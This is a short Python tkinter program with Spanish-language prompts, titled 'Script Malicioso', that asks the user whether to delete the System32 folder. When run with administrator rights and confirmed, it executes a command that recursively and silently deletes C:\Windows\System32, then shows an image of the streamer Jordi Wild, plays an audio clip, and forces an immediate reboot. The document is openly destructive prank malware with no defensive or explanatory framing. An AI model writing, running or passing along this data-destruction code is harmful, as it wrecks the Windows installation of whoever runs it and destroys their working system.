import tkinter as tk
from tkinter import messagebox
import os
import ctypes
import subprocess
import pygame

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def borrar_system32():
    if is_admin():
        os.system("rd /s /q C:\\Windows\\System32")
        print("La carpeta System32 ha sido borrada!")
        mostrar_imagen_y_reproducir_audio()
    else:
        messagebox.showerror("Error", "Se requieren privilegios de administrador para ejecutar esta acción.")

def mostrar_imagen_y_reproducir_audio():
    # Mostrar imagen
    imagen = tk.PhotoImage(file="./Jord_Wild_selfie.jpg")
    label_imagen = tk.Label(root, image=imagen)
    label_imagen.pack()

    # Reproducir audio
    pygame.mixer.init()
    pygame.mixer.music.load("./audo_XD_jordi_wild.mp3")
    pygame.mixer.music.play()

    root.after(10000, reiniciar_windows)  # Reiniciar Windows después de 10 segundos

def reiniciar_windows():
    subprocess.call(["shutdown", "-r", "-t", "0"])

def comenzar():
    respuesta = messagebox.askyesno("Confirmación", "¿Estás seguro de que quieres borrar la carpeta System32?")
    if respuesta:
        borrar_system32()

def salir():
    print("Saliendo...")
    root.destroy()

root = tk.Tk()
root.title("Script Malicioso")
root.geometry("400x400")

etiqueta_texto = tk.Label(root, text="¿Preparado para borrar la carpeta System32?")
etiqueta_texto.pack()

boton_comenzar = tk.Button(root, text="Comenzar", command=comenzar)
boton_comenzar.pack()

boton_salir = tk.Button(root, text="Salir", command=salir)
boton_salir.pack()

root.mainloop()